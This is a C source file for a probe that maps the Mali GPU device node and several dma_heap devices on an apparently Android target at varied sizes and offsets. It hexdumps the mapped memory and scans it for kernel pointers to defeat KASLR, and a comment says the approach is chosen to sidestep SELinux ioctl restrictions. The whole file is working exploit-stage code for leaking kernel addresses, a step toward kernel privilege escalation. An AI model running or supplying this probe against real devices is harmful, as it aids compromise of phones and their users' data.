/*
 * mali_mmap_leak.c - try mmap on /dev/mali0 to find kernel pointers
 * No ioctl needed. SELinux distinguishes mmap/map from ioctl.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static int has_kernel_addr(uint64_t val) {
    if ((val >> 48) != 0xffff) return 0;
    uint32_t hi = (uint32_t)(val >> 32);
    if (hi >= 0xffffff80 && hi <= 0xffffff8f) return 0; /* P0 direct-map */
    return 1;
}

static void scan_for_pointers(const void *buf, size_t len, const char *label) {
    const uint64_t *p = (const uint64_t *)buf;
    size_t count = len / sizeof(uint64_t);
    int found = 0;
    for (size_t i = 0; i < count; i++) {
        if (p[i] != 0 && has_kernel_addr(p[i])) {
            printf("  LEAK[%s] offset=0x%zx val=0x%016llx\n",
                   label, i * 8, (unsigned long long)p[i]);
            found++;
            if (found > 20) { printf("  ... (truncated)\n"); break; }
        }
    }
    if (!found) printf("  [%s] no kernel pointers found\n", label);
}

static void hexdump(const void *buf, size_t len, size_t max) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t show = len < max ? len : max;
    for (size_t i = 0; i < show; i += 16) {
        printf("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i + j < show; j++)
            printf("%02x ", p[i + j]);
        /* ASCII */
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < show; j++) {
            uint8_t c = p[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("|\n");
    }
    if (len > max) printf("  ... (%zu more bytes)\n", len - max);
}

/* Try mmap with different offset values */
static void try_mmap_offset(int fd, off_t offset, size_t len, const char *label) {
    void *p = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, offset);
    if (p == MAP_FAILED) {
        printf("  mmap(%s, offset=0x%lx, len=0x%zx) failed: %s\n",
               label, (long)offset, len, strerror(errno));
        return;
    }
    printf("  mmap(%s, offset=0x%lx, len=0x%zx) = %p\n",
           label, (long)offset, len, p);

    /* Read first bytes */
    hexdump(p, len, 256);

    /* Scan for kernel pointers */
    scan_for_pointers(p, len, label);

    /* Also try writing to trigger different behavior */
    /* Read-only scan is sufficient */

    munmap(p, len);
}

int main(void) {
    printf("=== mali mmap KASLR leak probe ===\n");

    int fd = open("/dev/mali0", O_RDONLY);
    if (fd < 0) {
        printf("Cannot open /dev/mali0: %s\n", strerror(errno));
        return 1;
    }
    printf("Opened /dev/mali0 fd=%d\n\n", fd);

    /* Try various mmap sizes and offsets */
    printf("--- mmap offset=0, various sizes ---\n");
    size_t sizes[] = {4096, 65536, 1<<20, 16<<20};
    for (int i = 0; i < 4; i++) {
        char label[32];
        snprintf(label, sizeof(label), "sz=0x%zx", sizes[i]);
        try_mmap_offset(fd, 0, sizes[i], label);
    }

    printf("\n--- mmap size=4K, various offsets ---\n");
    off_t offsets[] = {0, 0x1000, 0x10000, 0x100000, 0x1000000, 0x10000000};
    for (int i = 0; i < 6; i++) {
        char label[32];
        snprintf(label, sizeof(label), "off=0x%lx", (long)offsets[i]);
        try_mmap_offset(fd, offsets[i], 4096, label);
    }

    printf("\n--- mmap size=64K, off=0 (likely GPU SRAM/regs) ---\n");
    try_mmap_offset(fd, 0, 65536, "64K-at-0");

    close(fd);

    /* Also try /dev/dma_heap/ devices */
    printf("\n=== Try dma_heap mmap ===\n");
    const char *heaps[] = {
        "/dev/dma_heap/system",
        "/dev/dma_heap/xring_npu_dym",
        "/dev/dma_heap/xring_cpa",
        NULL
    };
    for (int i = 0; heaps[i]; i++) {
        int hfd = open(heaps[i], O_RDONLY);
        if (hfd < 0) {
            printf("  %s: %s\n", heaps[i], strerror(errno));
            continue;
        }
        printf("  Opened %s fd=%d\n", heaps[i], hfd);
        /* dma_heap doesn't support mmap directly, but try anyway */
        try_mmap_offset(hfd, 0, 4096, heaps[i]);
        close(hfd);
    }

    printf("\nDone.\n");
    return 0;
}
